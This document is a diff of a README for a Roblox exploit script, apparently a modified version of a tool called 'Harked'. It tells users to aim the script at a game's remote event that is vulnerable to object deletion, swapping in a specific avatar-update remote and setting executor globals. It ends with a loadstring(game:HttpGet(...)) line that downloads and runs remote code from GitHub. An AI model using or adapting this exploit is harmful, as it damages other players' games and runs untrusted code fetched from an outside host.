@@ -3,12 +3,12 @@ Fixed version of 'Harked' by Harkinian. Made the ability to customize the deleti
 
 To run, edit the following script accordingly, and then execute:
 ```lua
-local _G.rem = game.ReplicatedStorage.HouseChannel -- Change this to whatever remote is vulnerable for deletion
+local function Destroy(a: Instance)
+    local _G = getgenv()
 
-local function Delete(a: Instance)
     local args = { -- Change the arguments depending on how the remote works.
-        [1] = a,
-        [2] = true
+        [1] = "wear"
+        [2] = a
     }
     
     if _G.rem:IsA("RemoteEvent") then
@@ -20,7 +20,8 @@ local function Delete(a: Instance)
     end
 end
 
-_G.Delete = Delete
+getgenv().rem = game.ReplicatedStorage.RE["1Updat1eAvata1r"] -- Change this to whatever remote is vulnerable for deletion
+getgenv().Destroy = Destroy
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/qtip-rbxl/HarkedV2/main/main.lua", true))()
 ```
